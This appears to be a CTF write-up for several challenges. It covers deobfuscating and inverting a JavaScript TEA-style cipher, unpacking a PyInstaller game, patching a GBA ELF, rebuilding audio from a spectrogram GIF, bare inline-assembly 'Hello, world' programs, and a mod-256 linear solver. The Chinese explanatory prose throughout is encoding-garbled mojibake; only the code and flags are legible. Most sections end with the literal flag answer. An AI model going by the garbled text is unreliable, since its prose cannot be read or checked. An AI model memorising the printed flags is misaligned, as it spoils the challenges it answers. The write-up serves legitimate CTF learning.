ä»¥åŠå¯¹åº”çš„åˆå§‹åŒ–å‡½æ•°ï¼Œæ£€æŸ¥è®¡ç®—å½“å‰å­—ç¬¦ä¸²æ•°ç»„çš„å“ˆå¸Œå€¼ï¼Œå¹¶è¿›è¡Œæ•°ç»„çš„æ›´æ”¹æ“ä½œï¼Œä»¥å¾—åˆ°æ­£ç¡®çš„æ•°ç»„ï¼š
```js
(function (_0x2018e5, _0xd122c5) {
  const _0x4a600d = _0x2c9e,
    _0x2e34d2 = _0x2018e5();
  while (!![]) {
    try {
      const _0x4d38c4 =
        (-parseInt(_0x4a600d(0x1b1)) / 0x1) * (parseInt(_0x4a600d(0x1ad)) / 0x2) +
        (-parseInt(_0x4a600d(0x1b2)) / 0x3) * (parseInt(_0x4a600d(0x1b6)) / 0x4) +
        (-parseInt(_0x4a600d(0x1ae)) / 0x5) * (-parseInt(_0x4a600d(0x1b4)) / 0x6) +
        (parseInt(_0x4a600d(0x1ab)) / 0x7) * (parseInt(_0x4a600d(0x1af)) / 0x8) +
        parseInt(_0x4a600d(0x1b5)) / 0x9 + -parseInt(_0x4a600d(0x1b3)) / 0xa +
        (-parseInt(_0x4a600d(0x1a9)) / 0xb) * (-parseInt(_0x4a600d(0x1a7)) / 0xc);
      if (_0x4d38c4 === _0xd122c5) break;
      else _0x2e34d2["push"](_0x2e34d2["shift"]());
    } catch (_0x416145) {
      _0x2e34d2["push"](_0x2e34d2["shift"]());
    }
  }
})(_0x381b, 0x21c08);
```

åœ¨ node ç¯å¢ƒä¸­æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰§è¡Œè¿™ä¸‰è€…ï¼Œå¹¶åœ¨è¿è¡Œåä¸ºä»–ä»¬èµ‹äºˆåˆ«åï¼Œæ¯”å¦‚ï¼š
```js
let get_table = _0x381b;
let get_str = _0x22517d;
```
è¿™é‡Œçš„ä¾‹å­æ¯”è¾ƒç®€å•ï¼Œåœ¨æ›´å¤æ‚çš„æƒ…å†µä¸‹ï¼Œé€šå¸¸åªéœ€å®šä½å‡½æ•°å’Œå…¶å¯¹åº”çš„å˜é‡åï¼Œåœ¨åæ··æ·†è¿‡ç¨‹ä¸­ï¼Œå…ˆåœ¨ node ç¯å¢ƒä¸­è¿è¡Œï¼Œè·å–åˆ°çœŸæ­£çš„å­—ç¬¦ä¸²è·å–å‡½æ•°åï¼Œå½“é‡åˆ°éœ€è¦è·å–å­—ç¬¦ä¸²æ—¶å€™ï¼Œç›´æ¥åœ¨ node ç¯å¢ƒä¸­è°ƒç”¨è§£ç å³å¯ã€‚

è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é¡ºåˆ©è§£ç å¯è§çš„ç¬¬äºŒä¸ªå‡½æ•°çš„æ„ä¹‰äº†ï¼Œæ—¢ç„¶å‡½æ•°åä¸º encryptï¼Œå³å¯åˆç†æ¨æµ‹å‡ ä¸ªå˜é‡åï¼Œåæ··æ·†æ•´ç†åå¯å¾—ï¼š
```js
String["prototype"]["encrypt"] = function (keystr) {
  const result = new Array(2), key = new Array(4);
  let ans = "";
  plaintext = escape(this);
  for (var i = 0; i < 4; i++)
    key[i] = Str4ToLong(keystr.slice(i * 4, (i + 1) * 4));
  for (i = 0; i < plaintext.length; i += 8) {
    result[0] = Str4ToLong(plaintext.slice(i, i + 4));
    result[1] = Str4ToLong(plaintext.slice(i + 4, i + 8));
    code(result, key);
    ans += LongToBase16(result[0]) + LongToBase16(result[1]);
  }
  return ans;
};
```

ä»¥åŠè°ƒç”¨å®ƒçš„åœ°æ–¹ï¼š
```js
function gyflagh(_0x111955) {
  const _0x50051f = _0x22517d;
  let _0x3b790d = _0x111955[_0x50051f(0x1a8)](_0x50051f(0x1b7));
  if (_0x3b790d === _0x50051f(0x1aa)) return !![];
  return ![];
}
```

åˆ©ç”¨å­—ç¬¦ä¸²æ•°ç»„è§£ç åï¼Œå…¶é€»è¾‘ä¹Ÿå°±æ˜¯
```js
function gyflagh(ans) {
  return ans.encrypt("1356853149054377") === "6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c";
}
```

ç›®å‰ä¸ºæ­¢æˆ‘ä»¬æœ€å…³å¿ƒçš„ï¼Œæ˜¯é‚£ä¸ªè¢«æ˜æ–‡æŒ‡æ˜ä¸º`code`çš„å‡½æ•°ã€‚è®¡ç®—`0x52cfb2de + 0x4b67c6db`å¯ä»¥å‘ç°å®ƒæ˜¯`0x9e3779b9`ï¼Œå®ƒå¯ä»¥è¯´æ˜¯ç±»TEAç®—æ³•çš„`magic number`ï¼ŒåŒæ—¶å·¦ç§»å››å³ç§»äº”çš„æ“ä½œä¹Ÿè®©äººæ›´åŠ ç¡®ä¿¡è¿™å°±æ˜¯ä¸€ä¸ªç±»TEAåŠ å¯†ã€‚

å°†ç”¨é€—å·åˆ†éš”çš„è¯­å¥å±•å¼€ã€é‡å‘½åå˜é‡åç§°åä¾¿å¾—åˆ°äº†å¦‚ä¸‹çš„ç¼–ç å‡½æ•°ï¼š
```js
function code(v, k) {
  let highbit = v[0], lowbit = v[1];
  const delta = 0x9e3779b9, tot = delta * 0x20;
  let sum = 0x0;
  while (sum != tot) {
    highbit += (((lowbit << 4) ^ (lowbit >>> 5)) + lowbit) ^ (sum + k[sum & 3]);
    sum += delta;
    lowbit += (((highbit << 4) ^ (highbit >>> 5)) + highbit) ^ (sum + k[(sum >>> 11) & 3]);
  }
  v[0] = highbit;
  v[1] = lowbit;
}
```

ä¸ä¹‹å¯¹åº”å¯ä»¥å†™å‡ºè§£ç å‡½æ•°ï¼ŒTEAçš„è§£ç ä¸€èˆ¬å°±æ˜¯æ¢ä¸ªé¡ºåºã€åŠ æ³•å˜å‡æ³•å³å¯ï¼š
```js
function decode(v, k) {
  let highbit = v[0], lowbit = v[1];
  const delta = 0x9e3779b9;
  let now = delta * 0x20;
  while (now != 0) {
    lowbit -= (((highbit << 4) ^ (highbit >>> 5)) + highbit) ^ (now + k[(now >>> 11) & 3]);
    now -= delta;
    highbit -= (((lowbit << 4) ^ (lowbit >>> 5)) + lowbit) ^ (now + k[now & 3]);
  }
  v[0] = highbit;
  v[1] = lowbit;
}
```

æ—¢ç„¶å¦‚æ­¤å¯é€†ï¼Œåˆå‘ç° Base16ToLong æ˜¯æ¯æ¬¡æ¥å—8ä½16è¿›åˆ¶ï¼Œé‚£ä¹ˆä¸å¦¨å†™ä¸ª decrypt å‡½æ•°ï¼š
```js
String["prototype"]["decrypt"] = function (keystr) {
  const result = new Array(2),
    key = new Array(4);
  let ans = "";
  ciphertext = escape(this);
  for (var i = 0; i < 4; i++)
    key[i] = Str4ToLong(keystr.slice(i * 4, (i + 1) * 4));
  for (i = 0; i < ciphertext.length; i += 16) {
    result[0] = Base16ToLong(ciphertext.slice(i, i + 8));
    result[1] = Base16ToLong(ciphertext.slice(i + 8, i + 16));
    decode(result, key);
    ans += LongToStr4(result[0]) + LongToStr4(result[1]);
  }
  return ans;
};
```

æœ€åçš„æœ€åï¼Œæ˜¯è°è¢«ç¼–ç äº†å‘¢ï¼Ÿâ€”â€” æƒ³å¿…å°±æ˜¯ flag äº†ã€‚
```js
let ciphertext =
  "6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c";
let key = "1356853149054377";
let flag = ciphertext.decrypt(key);

console.log('flag{' + flag + '}');
```

**flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i}**

## Micro World

å—¯ï¼Œæ‰“å¼€ç¨‹åºï¼Œä¸€å¤§å †è“è‰²ç‚¹ç‚¹åœ¨åŠ¨ã€‚é‚£å°±é€†ä¸€ä¸‹å§â€”â€”éšå³å°±çœ‹åˆ°äº† `__main__` å­—æ ·ï¼Œé‚£è¿˜é€†ä»€ä¹ˆé€†å•Šï¼Œç›´æ¥è§£åŒ…åæ±‡ç¼–å•Šï¼ˆ

python æ‰“åŒ…å™¨æ‰“åŒ…å‡ºçš„ exe å¯ä»¥é€šè¿‡ [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) è§£åŒ…ï¼Œè€Œåå¯ä»¥é€šè¿‡ [uncompyle6](https://github.com/rocky/python-uncompyle6/) å¯¹æ ¸å¿ƒæ–‡ä»¶ `2.py` è¿›è¡Œåæ±‡ç¼– â€”â€”

ç„¶åå°±å¾—åˆ°äº†å¾ˆæ¥è¿‘äºæºæ–‡ä»¶çš„ python ä»£ç äº†ï¼Œä½†æ˜¯å°è¯•è¿è¡Œæ—¶å‘ç°è¿è¡Œåçš„è“ç‚¹æ•°é‡æ˜æ˜¾ä¸‹é™ï¼Œæ€€ç–‘ç¨‹åºè‡ªèº«é€»è¾‘é—®é¢˜ã€‚æ£€æŸ¥åå‘ç°åœ¨å‡½æ•° `next_pos_list` ä¸­é”™è¯¯åœ°å­˜åœ¨ç€ä¸¤ä¸ª `for-else` ç»“æ„ï¼Œä¿®å¤åè¾“å‡ºç‚¹å›¾ï¼Œå‘ç°ä¾ç„¶æ— æ³•è¯†åˆ«ã€‚

æœ€ååœ¨åˆå§‹åŒ–ç‚¹åˆ—çš„è¿‡ç¨‹ä¸­å°†é€Ÿåº¦ç›´æ¥åå‘ï¼š
```py
Pointlist = []
for item in list_:
    Pointlist.append(Point((item[0], item[1]), -item[2], -item[3]))
```

åœ¨ç¬¬äºŒåä¸ƒå¸§å·¦å³çš„ä½ç½®å¯ä»¥ç”¨å¾—åˆ°è¾ƒä¸ºæ¸…æ™°çš„ flagï¼š
```py
ax = plt.gca()
ax.invert_yaxis()

for _ in range(27):
    Pointlist = next_pos_list(Pointlist)

plt.scatter([item.x for item in Pointlist], [item.y for item in Pointlist])
plt.show()
```

![](https://cdn.gztime.cc/hg2021/microworld.svg)

å¯ä»¥å¾—åˆ°ç­”æ¡ˆï¼š

**flag{Rev3sEtiM^5}**

## å·ç‹ä¸é‡ç”Ÿçš„ GPA

åšè¿™é“é¢˜æœ€å¤§çš„ä¸€ä»¶äº‹åœ¨äºé€‰å¥½æ¨¡æ‹Ÿå™¨â€¦â€¦

æœ€å¼€å§‹æˆ‘ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªéšæ„ä¸‹è½½çš„GBAæ¨¡æ‹Ÿå™¨ï¼Œç”¨èµ·æ¥ä¸å¤ªèˆ’æœï¼Œè€Œä¸”å¾ˆæ²¡ç”¨å¤´ç»ªæ€ä¹ˆå»æã€‚

ä¹‹åé€†å‘äº†ELFæ–‡ä»¶ï¼Œçœ‹åˆ°äº† decrypt å‡½æ•°ï¼Œæå–å‡ºç›¸åº”çš„æ•°æ®è¿›è¡Œè§£ç ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡èƒ½å¾—åˆ° flag çš„å›¾ç‰‡ï¼Œåƒç´ ç‚¹çš„ç»„ç»‡ã€é¢œè‰²çš„æ˜ å°„ç­‰å„æ–¹é¢éƒ½ä¸æ˜¯å¾ˆç¡®å®šã€‚

ä¹‹åæ¢äº†ä¸ªæ¨¡æ‹Ÿå™¨ï¼Œ[mGBA](https://github.com/mgba-emu/mgba/)ï¼Œå®ƒç”šè‡³æ”¯æŒä¸­æ–‡ï¼Œä¹Ÿæ¯”ä¸Šä¸€ä¸ªå¥½ç”¨å¾ˆå¤šã€‚

å½“æ—¶å› ä¸ºæ²¡æœ‰å·¥å…·å°†ELFè½¬æ¢ä¸ºgbaçš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸€ç›´éƒ½æ²¡æƒ³ç€ç›´æ¥ä¿®æ”¹ç¨‹åºï¼ˆåšå®Œæ—¶å€™æ„è¯†åˆ°ä»£ç çš„å­—èŠ‚åº”è¯¥ä¼šç›´æ¥æ‹·è´è¿‡å»ä¸ä¼šæ”¹å˜ï¼Œmcfx çš„ wp ä¹Ÿè¯æ˜äº†è¿™ä¸€äº‹å®ï¼‰

â€”â€”

ç›´åˆ°å› ä¸ºæ‰‹æ»‘ç‚¹é”™ï¼Œç»™mBGAç›´æ¥æ‰”äº†ä¸ª `.elf` æ–‡ä»¶è¿›å»ï¼Œç„¶åå®ƒæ­£å¸¸è¿è¡Œäº†ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼â”—|ï½€Oâ€²|â”› å—·~~

é‚£ä¹ˆ â€”â€” é¢˜ç›®åˆ°æ­¤ç»“æŸï¼Œç›´æ¥å°† ELF ä¸­çš„æŸä¸€å¸¸è§„å‡½æ•°è°ƒç”¨ patch ä¸º `BL decrypt` å³å¯ã€‚

åœ¨äºŒè¿›åˆ¶å±‚é¢ï¼Œåªéœ€è¦å°†`67054 - 67055` ä¸¤ä¸ªå­—èŠ‚æ”¹ä¸º `\xc2\xff` å³å¯ã€‚

![](https://cdn.gztime.cc/hg2021/gpapatch.jpg)

å†æ¬¡è¿è¡Œï¼Œéšæ„æ“ä½œä¸€ä¸‹ï¼Œå³å¯å¾—åˆ°ï¼š

![](https://cdn.gztime.cc/hg2021/gpa1.jpg)


**flag{FuR4Gu_geto_da2e!}**

## pğŸ˜­q

è™½ç„¶æè¿°å¾ˆå°‘ï¼Œä½†æ˜¯æ€è·¯å´å¾ˆæ˜ç¡®ï¼šå‚…ç«‹å¶å˜æ¢å°†éŸ³é¢‘æ—¶åŸŸè½¬æ¢ä¸ºäº†é¢‘åŸŸä¿¡æ¯ï¼Œé¢‘åŸŸä¿¡æ¯çš„èƒ½é‡å€¼è¢«è½¬æ¢ä¸ºåˆ†è´ï¼Œè€Œåå­˜äºæ¯ä¸€å¸§çš„é«˜åº¦ä¸Šã€‚

å› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨`ffmpeg -i flag.gif ./frames/%4d.png`å¯¼å‡ºæ¯ä¸€å¸§ã€‚ç„¶åå¯ä»¥é€šè¿‡ä¸‰åäºŒä¸ªé‡‡æ ·åˆ—æŒ‰è¡Œè®¡æ•°å¾—åˆ°å“åº¦æ•°ç»„ã€‚

```py
from PIL import Image
import numpy as np

BAR_NUM = 32
BAR_POS = [3 + i * 4 for i in range(BAR_NUM)]

res = []

for i in range(1, 588):
    line = np.zeros((32), dtype=np.uint32)
    img = Image.open(f'frame/{i:04}.png')
    for height in range(92):
        row = [1 if img.getpixel((i, height))[1] == 0 else 0 for i in BAR_POS]
        line = line + np.array(row)
    res.append(line)
```

æŸ¥é˜… `librosa` çš„[æ‰‹å†Œ](https://librosa.org/doc/latest/feature.html#feature-inversion)å¯ä»¥å¾—åˆ°æœ‰å…³äºé‡‡æ ·é€†å˜æ¢çš„ç›¸å…³æ–¹æ³•ï¼Œç…§ç€é¢˜ç›®ç»™å‡ºçš„ä»£ç ä¸€æ­¥ä¸€æ­¥é€†å‘å˜æ¢ï¼Œå°±èƒ½å¾—åˆ°ç»“æœäº†ã€‚

```py
import librosa
import soundfile

sample_rate = 22050
frame_step_size = 512
min_db = -60

spectrogram = np.array(res).transpose() + min_db
spectrogram = librosa.db_to_power(spectrogram)
audio = librosa.feature.inverse.mel_to_audio(spectrogram, hop_length=frame_step_size)
soundfile.write('result.wav', audio, sample_rate)
```
å¾—åˆ°éŸ³é¢‘ï¼š

<audio src="https://cdn.gztime.cc/hg2021/fourier.mp3" controls></audio>

ä¸€æ®µç®€å•çš„è‹±è¯­å¬åŠ›æµ‹è¯•ï¼ˆbushi

**flag{634971243582}**

## Amnesia

### è½»åº¦å¤±å¿†

`.data` å’Œ `.rodata` æ®µä¸­çš„ä»£ç è¢«æ¸…é›¶ä¹‹åæœ€å¤§çš„å½±å“å°±æ˜¯æˆ‘ä»¬ä¸èƒ½å­˜å‚¨å¸¸é‡äº†ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å¸¸é‡ä¸èƒ½è¢«å­˜å‚¨ã€‚å› æ­¤å¯ä»¥ç”¨ä¸€ç§åªä¼šç”¨åˆ°å‡½æ•°æ ˆçš„è¾“å‡ºæ–¹æ³•ï¼š

```c
#include <stdio.h>
int main()
{
    int buf = 72;
    putchar(buf);
    buf += 29;
    putchar(buf);
    buf += 7;
    putchar(buf);
    buf += 0;
    putchar(buf);
    buf += 3;
    putchar(buf);
    buf += -67;
    putchar(buf);
    buf += -12;
    putchar(buf);
    buf += 87;
    putchar(buf);
    buf += -8;
    putchar(buf);
    buf += 3;
    putchar(buf);
    buf += -6;
    putchar(buf);
    buf += -8;
    putchar(buf);
    buf += -67;
    putchar(buf);
    return 0;
}
```

**flag{S0_S1mp1e_r1ght_a6edd8c49e}**

### è®°å¿†æ¸…é™¤

> æ±‡ç¼–ä¸æŒ‡ä»¤é›†ç›¸å…³çŸ¥è¯†æˆ‘åªæ˜¯ç•¥çŸ¥ä¸€äºŒï¼Œå¹¶æ²¡æœ‰ä½“ç³»åŒ–å’Œå®Œæ•´åœ°å­¦è¿‡ã€‚
> ä¸ºäº†çŸ¥è¯†çš„æ­£ç¡®æ€§ï¼Œå¦‚æœ‰é”™è¯¯çš„åœ°æ–¹ä¹Ÿè¯·æŒ‡å‡ºå’Œæ–§æ­£ã€‚
> éƒ¨åˆ†é—®é¢˜æˆ‘æ²¡æœ‰é‡åˆ°è¿‡çš„åŸå› æ˜¯æˆ‘æœ¬åœ°ç¯å¢ƒä¸è¿œç¨‹ç¯å¢ƒè¡Œä¸ºä¸€è‡´ï¼Œå› æ­¤æ²¡æœ‰è¿‡å¤šè€ƒè™‘å’Œäº†è§£ä¸€äº›æœ‹å‹é‡åˆ°çš„å·®å¼‚ã€‚

é¦–è¦è§£å†³çš„é—®é¢˜æ˜¯ï¼Œç”±äº`.text`æ®µè¢«æ¸…ç©ºï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªæ–°çš„æ®µæ¥å­˜æ”¾å¯æ‰§è¡Œçš„ä»£ç ã€‚æ­¤æ—¶`.xdata`å°±æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨ç¼–è¯‘å‚æ•°ä¸­å¢åŠ ä¸€ä¸ªæ®µï¼Œå¹¶ä¸”å°†è‡ªå·±çš„å‡½æ•°æ”¾ä¸Šå»ï¼Œç›¸å…³æ“ä½œéœ€è¦ç”¨åˆ°`__attribute((section(".xdata")))`æ¥è¿›è¡Œå‡½æ•°å£°æ˜ã€‚

å½“ç¨‹åºåœ¨æ­£å¸¸ç¼–è¯‘æ—¶ï¼Œ`_start`å’Œ`__libc_start_main`å’Œå…¶ä»–çš„ä¸€äº›å‡½æ•°ä¼šè¿›è¡Œå †æ ˆç©ºé—´çš„åˆå§‹åŒ–ç­‰ç­‰ï¼Œä»–ä»¬çš„å­˜åœ¨å¯èƒ½ä¼šå½±å“æˆ‘ä»¬çš„ç¨‹åºï¼Œå› æ­¤é€‰æ‹©ä½¿ç”¨`__asm()`ç›´æ¥ç¼–å†™å†…è”æ±‡ç¼–ï¼Œç³»ç»Ÿè°ƒç”¨è°ƒç”¨`sys_write`è¾“å‡ºå­—ç¬¦ä¸²å¹¶ä½¿ç”¨`sys_exit`æ‰‹åŠ¨é€€å‡ºã€‚

åœ¨è¿™æ ·ç¼–è¯‘ä¹‹åï¼Œè¿›è¡Œ`.text`æ®µçš„åˆ é™¤ï¼Œå‘è§‰è¢«ä¿®æ”¹åçš„ç¨‹åºä¼šæŠ¥å‡º`segmentation fault`ã€‚äºæ˜¯ç”¨ gdb è¿›è¡Œè°ƒè¯•ï¼Œå‘è§‰æ¯æ¬¡åˆ° `main` çš„æ ¸å¿ƒé€»è¾‘**ä¹‹å‰**ä¼šæœ‰ä¸€ä¸ªå¥‡æ€ªçš„æ®µé”™è¯¯å’Œå¯„å­˜å™¨è®¿é—®ï¼Œè€Œè¿™ä¸€è®¿é—®åœ¨IDAä¸­æ²¡æœ‰è§åˆ°ï¼Œæœ€å¼€å§‹æ€€ç–‘æ˜¯ gdb ä¸ºäº†è°ƒè¯•è€Œæ’æ¡©ã€‚

å½“æ—¶æ½œæ„è¯†ä¸­è¿˜ä¸€ç›´è®¤ä¸ºåœ¨x86ä¸­`nop`å¯¹åº”çš„æ±‡ç¼–æ˜¯`0x00`ï¼Œè€Œå½“æ„è¯†åˆ°`nop`æ˜¯`0x90`ä¹‹åäº‹æƒ…è¿æ¥äº†è½¬æœºã€‚

åœ¨ Intel x86 æŒ‡ä»¤é›†ä¸­ï¼Œ`0x00 0x00` -> `add BYTE PTR [eax], al;`

ä½†é¢å¯¹ä¸€å¤§æ®µçš„ `0x00`ï¼ŒCPU å¯èƒ½ä¼šå¿½ç•¥è¿‡é•¿çš„æ— æ³•è¢«æ­£ç¡®è¯†åˆ«çš„æŒ‡ä»¤ï¼Œè€Œ Intel x86 ç°æœ‰ç»“æ„æœ€é•¿15ä¸ªå­—èŠ‚ï¼Œå¯ä»¥çŒœæµ‹å¦‚æœæˆ‘ä»¬åˆšåˆšå¥½èƒ½å¯¹é½ 15 çš„æ•´æ•°å€ï¼Œæ˜¯å¦å°±å¯ä»¥è·³è¿‡è¿™æ ·çš„éæ³•è®¿é—®å‘¢ï¼Ÿ

åŸºäºè¿™æ ·çš„æ€è·¯ï¼ŒæˆåŠŸæ„é€ å‡ºè¿‡å…³æ‰€ç”¨çš„ä¸¤ä¸ª payload:
```c
int __attribute((section(".xdata"))) main()
{
    __asm(
          ".byte 0x00                      \n" // padding 0x00
          "mov $4, %eax                    \n" // sys_write
          "mov $str, %ecx                  \n" // from -> str
          "mov $1, %ebx                    \n" // to -> stdout
          "mov $14, %edx                   \n" // length -> 14
          "int $0x80                       \n" // syscall
          "mov $1, %eax                    \n" // sys_exit
          "mov $0, %ebx                    \n" // ret -> 0
          "int $0x80                       \n" // syscall
          "str: .ascii \"Hello, world!\\n\"\n");
}
```

è¿™ä¸ª payload åªæœ‰åœ¨è¢«åˆ é™¤ `.text` æ®µä¹‹åæ‰èƒ½è¢«æ­£å¸¸è¿è¡Œã€‚ä½¿ç”¨IDAåˆ†æå¯è§ç¬¬ä¸€å¥æŒ‡ä»¤å˜æˆï¼š
`add [eax+4], bh`ï¼Œæ‰€ä»¥â€¦â€¦æˆ‘ä¹Ÿä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆï¼ˆé€ƒï¼Œä¸è¿‡æ‰§è¡Œçš„æ—¶å€™ä¼¼ä¹é‚£ä¸€å¥å› ä¸ºæ°å¥½è¢«å¿½ç•¥è€Œé¡ºåˆ©è¾“å‡ºäº†ã€‚

```c
int __attribute((section(".xdata"))) main()
{
    __asm(
          "mov $0, %eax                    \n" // clear %eax
          "mov $4, %eax                    \n" // sys_write
          "mov $str, %ecx                  \n" // from -> str
          "mov $1, %ebx                    \n" // to -> stdout
          "mov $14, %edx                   \n" // length -> 14
          "int $0x80                       \n" // syscall
          "mov $1, %eax                    \n" // sys_exit
          "mov $0, %ebx                    \n" // ret -> 0
          "int $0x80                       \n" // syscall
          "str: .ascii \"Hello, world!\\n\"\n");
}
```

è¿™ä¸ª payload å¯ä»¥é¡ºåˆ©æ‰§è¡Œï¼Œæ— è®ºæ˜¯å¦æ¸…ç©º `.text` æ®µï¼Œè€Œç”¨IDAæŸ¥çœ‹ä¹Ÿå¯ä»¥å¾—åˆ°é¢„æœŸçš„æ±‡ç¼–ï¼Œæ£€æŸ¥åå…­è¿›åˆ¶ï¼Œæˆ–è®¸æ˜¯é‡åˆ°`0xB8`ï¼Œä¿®æ­£äº†æŒ‡ä»¤å§ã€‚

![](https://cdn.gztime.cc/hg2021/amnesia.jpg)

ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæ¢ç´¢è¿™é“é¢˜ç›®çš„è¿‡ç¨‹è¿˜æ˜¯ååˆ†æœ‰è¶£çš„ï¼Œé‡å¤åœ¨ç¼–è¯‘ï¼ŒIDAï¼Œæ”¹æ±‡ç¼–çš„å¾ªç¯ä¸­ï¼Œæœ€åæ‘¸ç´¢å‡ºç»“æœçš„ä½“éªŒä¸­ï¼Œä¹Ÿå­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ã€‚

mcfx çš„éé¢„æœŸè§£ä¹Ÿæ˜¯è¶…å‡ºäº†æˆ‘çš„é¢„æ–™â€¦â€¦

**flag{B3_sure_t0_c1e4r_BSS_d58668df85}**

## ç¯ï¼Œç­‰ç¯ç­‰ç¯

<div class='intro' style="font-size:0.9em">

æ²¡æœ‰å¬åˆ°å—ï¼Ÿåœ¨è€³è¾¹å›è¡ç€çš„é’Ÿå£°ã€‚

ä¼ é—»ä¸­ï¼Œè¿œå¤æ–‡æ˜èƒ½å¤Ÿæ•çŒé—ªç”µï¼Œå°†å…¶å°å°åœ¨èœ¿èœ’æ›²æŠ˜çš„æ³•é˜µä¸­ï¼Œç”¨ä»¥é©±åŠ¨ç‚¼é‡‘æœ¯çš„æœ€é«˜æˆå°±â€”â€”æœºæ¢°ä¹‹å¿ƒã€‚

è€Œåœ¨è¯¸å¤šæœºæ¢°ä¹‹å¿ƒçš„æµæ´¾é‡Œï¼Œè”šè“æ˜¯æ›¾ç»çš„ç‹è€…ã€‚æ— ä¿¡è€…çªƒå–ç¥æ˜çš„å¥‡è¿¹ï¼Œæ²‰æ¹äºè”šè“åˆ›é€ å‡ºæ¥çš„è™šå¹»ä¹‹é—´ï¼Œå¾—ä»¥é€ƒé¿æ®‹é…·çš„ç°å®ã€‚

åªæ˜¯ï¼Œç«å·²æ¸ç†„ï¼Œä½ä¸è§ç‹å½±ã€‚é‚£ä¸€æŠ¹çº¯å‡€çš„è”šè“ä¹Ÿé€æ¸æŸ“ä¸Šé“œé”ˆå’Œé“é”ˆçš„é¢œè‰²ã€‚ç ´è½çš„åœ£æ®¿ä¸­åªå‰©æ— åçš„å·¡ç¤¼è€…ï¼Œè¿˜åœ¨è¿½å¯»å½“å¹´å…ˆçŸ¥æ‘©å°”ç•™ä¸‹çš„è¶³è¿¹ã€‚

æ­¤æ—¶æ‰æ˜ç™½ï¼Œé‚£åˆ™é¢„è¨€çš„å«ä¹‰ï¼šç«ç„°ç†„ç­ä¹‹æ—¶ï¼Œé’Ÿå£°å“èµ·ï¼Œä½™ç°çº·æ²“è€Œæ¥ï¼Œè§£å¼€æ²‰å¯‚åƒå¹´çš„æœºå…³ï¼Œç‚¹äº®ä¼ æ‰¿çš„å›¾è…¾ã€‚æ— ç«çš„ä½™ç°ä¸èƒ½æˆä¸ºæŸ´è–ªï¼Œå¯ä¹Ÿè®¸æ­£å› è¿™æ ·ï¼Œæ‰ä¼šå¦‚æ­¤å‘å¾€å…‰æ˜å§ã€‚

è¿˜æ²¡æœ‰å¬åˆ°å—ï¼Ÿé‚£å›è¡åœ¨è€³è¾¹çš„ï¼Œå¤è€è€Œç†Ÿæ‚‰çš„ï¼Œé’Ÿå£°â€”â€”

ç¯ï¼Œç­‰ç¯ç­‰ç¯
</div>

![](https://cdn.gztime.cc/hg2021/dengdengdeng.jpg)

åœ¨è¿™é“é¢˜ä¸­ï¼Œä½ å¯ä»¥ç‚¹å‡»æ–¹å—ï¼Œè€Œå‘¨å›´ 5*5 èŒƒå›´å†…çš„æŸäº›æ–¹å—ä¼šå—åˆ°å½±å“ï¼Œå¹¶ä¸”äº®åº¦æ˜¯åœ¨æ¨¡ 256 çš„æ„ä¹‰ä¸‹è®¡ç®—çš„ï¼Œå¦‚æœè¶…å‡ºä¼šé‡ç½®ä¸º 0ï¼Œä½ çš„ç›®æ ‡æ˜¯ç‚¹å‡»è¿™äº›æ–¹å—ä»¥ä½¿å¾—å®ƒæ˜¾ç¤ºä¸ºä¸Šè¿°çš„æ ·å­ã€‚

æ¢å¥è¯è¯´ï¼Œæ“ä½œçŸ©é˜µé€šè¿‡å’Œä¸€ä¸ªå›ºå®šçš„å·ç§¯æ ¸åšå·ç§¯åå†å¯¹ 256 å–æ¨¡ï¼Œå…¶ç»“æœä¸é¢„æœŸç»“æœè¯¸ä½æ¯”è¾ƒåšå·®ï¼Œå–å…¶ç»å¯¹å€¼ä¹‹å’Œä½œä¸ºåˆ†æ•°ã€‚

åˆ†æå¯çŸ¥ï¼Œæ“ä½œçŸ©é˜µå…± 144 ä¸ªå˜å…ƒï¼Œæœ‰ 144 ä¸ªæ–¹ç¨‹è¿›è¡Œçº¦æŸï¼Œæ±‚åœ¨æ¨¡ 256 æ„ä¹‰ä¸‹çš„ä¸€ç»„è§£ã€‚è¿™ä¸€æ–¹ç¨‹ç»„æ˜¯ä¸€æ¬¡çº¿æ€§çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿé«˜æ–¯æ¶ˆå…ƒçš„è¿‡ç¨‹è¿›è¡Œæ±‚è§£ï¼Œä¸è¿‡éœ€è¦è€ƒè™‘çš„å°±æ˜¯åœ¨æ¨¡æ„ä¹‰ä¸‹æ€ä¹ˆæ›´æ”¹å…¶ç®—æ³•ã€‚

é¦–å…ˆéœ€è¦è¿›è¡Œçš„æ˜¯å°†å·ç§¯è½¬æ¢ä¸ºç³»æ•°çŸ©é˜µï¼š
```py
import numpy as np

kernel = np.array([
        [0,0,1,0,0],
        [0,0,2,0,0],
        [1,2,3,2,1],
        [0,0,2,0,0],
        [0,0,1,0,0],
    ])

coefficients = np.zeros((144,144))

for x in range(12):
    for y in range(12):
        for dx in range(-2, 3, 1):
            for dy in range(-2, 3, 1):
                xx = x + dx
                yy = y + dy
                if xx < 0 or xx >= 12 or yy < 0 or yy >= 12:
                    continue
                if (tmp := kernel[dx + 2][dy + 2]) > 0:
                    coefficients[x * 12 + y][xx * 12 + yy] = tmp
```

